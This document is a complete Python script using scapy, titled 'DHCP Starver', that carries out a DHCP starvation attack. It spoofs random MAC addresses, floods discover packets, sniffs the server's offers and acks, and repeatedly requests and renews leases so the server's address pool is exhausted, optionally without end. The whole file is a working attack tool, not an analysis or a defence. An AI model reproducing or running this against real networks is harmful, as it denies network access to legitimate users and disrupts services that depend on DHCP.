#!/usr/bin/env python3
from argparse import ArgumentParser
from scapy.all import *
import threading
import time
from queue import PriorityQueue

# tested with python3.6

def randomMac():
    firstByte = hex(int((bin(random.getrandbits(6)) + '10')[2:].zfill(8), 2))[2:]

    def hexB():
        return hex(int(random.getrandbits(8)))[2:]

    return firstByte + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB() + ":" + hexB()


attack_macs = []

usedMacAddresses = []


def getUniqueMac():
    while True:
        macAddr = randomMac()
        if macAddr not in usedMacAddresses:
            usedMacAddresses.append(macAddr)
            return macAddr


def getRandTransID():
    return random.randint(0, 0xFFFFFFFF)


# discover range of dhcp leasing addresses by flooding dhcp discover packets
class DhcpDiscoverFlood(threading.Thread):
    def __init__(self, target_server, stop_event, count=-1):
        threading.Thread.__init__(self, name='discoverFlood', daemon=True)
        self.target_server = target_server
        self.stop_event = stop_event
        self.remaining_count = count

    def run(self):
        sent_count = 1
        while not self.stop_event.isSet() and self.remaining_count != 0:
            mac_addr = getUniqueMac()
            print('[*] sending discover pkt', sent_count)
            sent_count += 1
            sendDiscover(mac_addr, self.target_server)
            self.remaining_count -= 1
        print('[<] discover flood thread finished')


def sendDiscover(macAddr, server_ip):
    transID = getRandTransID()
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=macAddr) / IP(dst='255.255.255.255', src='0.0.0.0') \
          / UDP(sport=68, dport=67) / BOOTP(op=1, xid=transID, chaddr=[mac2str(macAddr)]) \
          / DHCP(options=[("message-type", "discover"),
                          ("server_id", server_ip),
                          'end'])
    sendPkt(pkt)


class DhcpRequestWorker(threading.Thread):
    thread_id = 1

    def __init__(self, ip_queue, stop_event):
        self.thread_name = 'requestSender' + str(DhcpRequestWorker.thread_id)
        threading.Thread.__init__(self, name=self.thread_name, daemon=True)
        DhcpRequestWorker.thread_id += 1
        self.ip_queue = ip_queue
        self.stop_event = stop_event

    def run(self):
        while not self.stop_event.isSet():
            # queue.get() blocks, item at 1st index of returned pair is priority number (when dhcp lease expires),
            # lowest number is highest priority
            lease_expire_time, elem = self.ip_queue.get()
            if time.time() - lease_expire_time < 5.0:
                lease_ip = elem['lease_ip']
                if 'src_mac' in elem.keys():
                    src_mac = elem['src_mac']
                else:
                    src_mac = getUniqueMac()
                    attack_macs.append(src_mac)
                print('[*] sending request for', lease_ip, 'with mac', src_mac)
                sendRequest(lease_ip, src_mac)
            else:
                self.ip_queue.put((lease_expire_time, elem))
            self.ip_queue.task_done()
        print('[<] request thread', self.thread_name, 'finished')


def sendRequest(request_addr, src_mac):
    transID = getRandTransID()
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac) / IP(dst="255.255.255.255", src="0.0.0.0") \
          / UDP(dport=67, sport=68) / BOOTP(op=1, xid=transID, chaddr=[mac2str(src_mac)]) \
          / DHCP(options=[('message-type', 'request'),
                          ('requested_addr', request_addr),
                          # ('hostname', 'jonDeRipper'),
                          # ('server_id', server_ip),
                          'end'])
    sendPkt(pkt)


def sendPkt(pkt):
    global iface
    sendp(pkt, iface=iface, verbose=0)


def getDhcpOption(pkt, op):
    dhcp_options = pkt[DHCP].options
    for i in dhcp_options:
        if type(i) == tuple:
            if i[0] == op:
                return i[1]
    raise Exception('dhcp option ' + op + ' not found in pkt')


def getDhcpMessageType(pkt):
    return getDhcpOption(pkt, 'message-type')


class DhcpSniffer(threading.Thread):
    def __init__(self, iface, ip_queue, stop_event):
        threading.Thread.__init__(self, name='dhcpSniffer', daemon=True)
        self.iface = iface
        self.ip_queue = ip_queue
        self.stop_event = stop_event

    def offerCallback(self, pkt):
        offered_ip = pkt[BOOTP].yiaddr
        print('[*] dhcp offer detected for', offered_ip)
        self.ip_queue.put( (time.time(), {'lease_ip': offered_ip}) )

    def ackCallback(self, pkt):
        acked_ip = pkt[BOOTP].yiaddr
        acked_client_mac = pkt[Ether].dst
        offer_time = getDhcpOption(pkt, 'lease_time')  # in seconds
        lease_expire_time = time.time() + offer_time
        if acked_client_mac not in attack_macs:
            print('[-] detected client', acked_client_mac, 'with allocated IP', acked_ip)
        else:
            print('[+]', acked_ip, 'drained for next', offer_time, 'seconds')
            self.ip_queue.put((lease_expire_time, {'lease_ip': acked_ip, 'src_mac': acked_client_mac}))

    def nackCallback(self, pkt):
        nacked_ip = pkt[BOOTP].yiaddr
        nacked_client_mac = pkt[Ether].dst
        print('[-] allocation failed for', nacked_ip, 'mac', nacked_client_mac)

    def dhcpPktCallback(self, pkt):
        self.last_seen_dhcp = time.time()
        msg_type = getDhcpMessageType(pkt)
        # print('in dhcp pkt callback:', msg_type, pkt[BOOTP].show())
        if msg_type == 2:  # offer
            self.offerCallback(pkt)
        elif msg_type == 5:  # ack
            self.ackCallback(pkt)
        elif msg_type == 6:  # nack
            self.nackCallback(pkt)

    def run(self):
        self.last_seen_dhcp = time.time()
        while not self.stop_event.isSet():
            sniff(iface=self.iface, prn=self.dhcpPktCallback,
                  filter='src port 67', lfilter=lambda pkt: pkt.haslayer(DHCP), timeout=5)
            if time.time() - self.last_seen_dhcp > 9:
                print('[*] the wire is kinda quiet lately...')
                self.last_seen_dhcp = time.time()
        print('[<] dhcp sniffer thread finished')

def main():
    desciption = "DHCP Starver"
    parser = ArgumentParser(description=desciption)
    parser.add_argument('-t', '--target', required=True,
                        help='specify DHCP server IP')
    parser.add_argument('-i', '--iface', default='eth0',
                        help='specify interface for DHCP starver to use')
    parser.add_argument('-r', '--range', type=int, default=255,
                        help='max number of IPs in DHCP allocation (educated guess)')
    parser.add_argument('-p', '--persist', action='store_true', default=False,
                        help='if flag is specified, will persist DHCP starvation attack until %(prog)s is terminated'
                             ' (False)')
    parser.add_argument('-n', '--request-threads', default=3,
                        help='number of threads for sending out DHCP request (3)')

    global iface
    parsed_args = parser.parse_args()
    iface = parsed_args.iface
    target = parsed_args.target
    persist = parsed_args.persist
    ip_leasing_count = parsed_args.range
    num_of_req_threads = parsed_args.request_threads

    ip_queue = PriorityQueue()
    stop_event = threading.Event()

    threads = []

    threads.append( DhcpSniffer(iface, ip_queue, stop_event) )

    for i in range(num_of_req_threads):
        threads.append( DhcpRequestWorker(ip_queue, stop_event) )

    threads.append( DhcpDiscoverFlood(target, stop_event, ip_leasing_count) )

    for t in threads:
        t.start()

    if not persist:
        time.sleep(10)
        stop_event.set()

    for t in threads:
        t.join()

    print('[<] main thread finished')


if __name__ == '__main__':
    main()
